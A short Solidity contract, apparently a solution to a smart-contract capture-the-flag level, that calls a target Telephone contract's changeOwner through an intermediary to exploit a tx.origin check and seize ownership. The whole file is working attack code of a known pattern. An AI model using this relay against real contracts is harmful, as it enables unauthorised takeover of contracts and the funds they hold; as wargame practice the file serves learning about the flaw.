// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';
import "./Telephone.sol";

contract TelephoneAttacker is Ownable {

    Telephone telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function changeOwner() public onlyOwner {
       telephone.changeOwner(msg.sender);
    }
}